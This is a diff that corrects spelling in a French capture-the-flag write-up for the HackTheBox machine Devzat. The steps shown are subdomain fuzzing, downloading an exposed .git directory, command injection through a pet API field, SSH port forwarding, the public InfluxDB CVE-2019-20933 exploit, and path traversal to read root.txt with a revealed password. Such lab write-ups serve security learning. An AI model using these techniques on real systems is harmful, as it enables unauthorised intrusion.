@@ -43,23 +43,23 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Le site web parle d'un service de chat utilisant ssh sur le port 8000.
 Dans le code source il est mentioné HTML5UP, qui sont des template
-de html css et js.De plus nous ne remarquons pas de feature étrange sur le site,
+de html css et js.
+De plus nous ne remarquons pas de feature étrange sur le site,
 le site ne semble pas exploitable
 
 ## **SERVICE SSH PORT 8000**
 
 ![](../images/htb_devzat/ssh_8000.png)
 
-nous arrivons dans un system de chat textuelle avec un peu d'enumeration
-l'on remarque plein de feature de mini jeu, le pendu le morpions, etc.
-avec quelques essai d'injection de commandes.
-Le service ne semble pas vulnerable
+Nous arrivons dans un système de chat textuel avec un peu d'enumeration,
+Nous remarquons plein de features, des minis jeux: le pendu, le morpions, etc.
+Aprés quelques essai d'injection de commandes, Le service ne semblent pas vulnerable.
 
 ## **HTTP SUBDOMAIN**
 
 Les deux services ne semble pas vulnerable, essayons de fuzz le site web
-ainsi que les subdomain pour essayer de trouver quelque chose d'interessant.
-Il ce trouvera que le fuzz de subdomain est concluant
+ainsi que les subdomains pour essayer de trouver quelque chose d'interessant.
+Il se trouvera que le fuzz de subdomain est concluant
 
 ```
 ❯ wfuzz -c  -w /home/poney/Wordlist/./subdomains-top1million-5000.txt -u 'http://devzat.htb' -H "Host: FUZZ.devzat.htb"  --hw 26
@@ -81,7 +81,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 ![](../images/htb_devzat/web2.png)
 
-nous trouvons rapidement un répertoire .git qui nous donne acces aux code
+Nous trouvons rapidement un répertoire .git qui nous donne acces au code
 
 ```
 ❯ wget -r http://pets.devzat.htb/.git
@@ -90,8 +90,7 @@ nous trouvons rapidement un répertoire .git qui nous donne acces aux code
 HEAD est maintenant à ef07a04 back again to localhost only
 ```
 
-Nous pouvons maintenant analyser le code.
-dans le fichier main.go nous trouvons un élément interessant
+Nous pouvons maintenant analyser le code, dans le fichier main.go nous trouvons un élément interessant.
 
 ```
 func loadCharacter(species string) string {
@@ -104,8 +103,8 @@ func loadCharacter(species string) string {
 }
 ```
 
-L'injection de commande saute aux yeux nous allons modifier la requests web pour ajouter
-un ; et une autre commande
+L'injection de commande saute aux yeux nous allons modifier la request web pour ajouter
+un ; et une autre commande.
 
 ```
 ❯ curl 'http://pets.devzat.htb/api/pet' \
@@ -116,10 +115,9 @@ un ; et une autre commande
 
 ## **PRIVESC**
 
-nous avons maintenant access aux code source des deux sites web et ainsi
+Nous avons maintenant access aux codes source des deux sites web ainsi
 que du chat.
-Dans le code du systeme de chat l'on voit des message de bienvenue si l'on prend le
-user admin catherine ou patrick.
+Dans le code du système de chat, nous voyons des messages de bienvenue si nous prenons le user admin, catherine ou patrick.
 
 ```
 if strings.ToLower(u.name) == "patrick" {
@@ -152,13 +150,15 @@ if strings.ToLower(u.name) == "patrick" {
     u.writeln("devbot", "patrick has left the chat")
 ```
 
-1. Deux choses sont interresantes la présence de la meme app de chat en dev sur le port 8443
+Trois choses sont interresante.
+
+1. La présence de la meme app de chat en dev sur le port 8443
 qui poséde une nouvelle feature interessante.
 2. Un service influxdb qui tourne sur la machine.
-3. les sources ont sont dans des backups
+3. Les sources sont dans des backups
 
-Le service en dev tourne avec les droits root il est dont interresant.
-Nous Trouvons vite les fichiers de backups dans /var/backups
+Le service en dev tourne avec des droits root, il est donc interresant.
+Nous trouvons vite les fichiers de backups dans /var/backups
 
 ## **FORWARD LES PORT 8443 ET 8086**
 
@@ -167,12 +167,12 @@ ssh -NL 8443:127.0.0.1:8443 patrick@devzat.htb -i id_rsa
 ssh -NL 8086:127.0.0.1:8086 patrick@devzat.htb -i id_rsa
 ```
 
-Nous pouvons maintenant passer nmap sur les deux services
+Nous pouvons maintenant passer nmap sur les deux services.
 
 ## **DEVZAT-DEV**
 
 Aprés un peu d'enumeration sur le nouveau service quelque chose
-nous saute aux yeux la commande /file qui permet de lire un fichier
+nous saute aux yeux la commande /file qui permet de lire un fichier,
 malheureusement cette commande nous demande un password.
 
 ```
@@ -227,10 +227,9 @@ PORT     STATE SERVICE VERSION
 ```
 Nous trouvons rapidement une exploit compatible avec notre version de influxdb.
 
-https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933
+[https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)
 
-L'exploit as besoin d'une list de user on prend naturellement tout les users
-que l'on a croiser sur la box.
+L'exploit a besoin d'une liste de user, nous prenons naturellement tout les users que nous avons croiser sur la box.
 
 ```
 patrick
@@ -408,9 +407,9 @@ aze: /file ../root.txt CeilingCatStillAThingIn2021?
 aze:
 ```
 
-Nous avons récupéré le flag avec succés.
+Nous avons récupéré le flag avec succès.
 
 ## **CONCLUSION**
 
-Pour bien reussir cette machine il fallait bien lire les codes sources des app
-qui donné tout les indices nessaire pour trouver notre chemain.
+Pour bien reussir cette machine il fallait bien lire les codes source des apps
+qui donnaient tout les indices nécessaire pour trouver notre chemin.
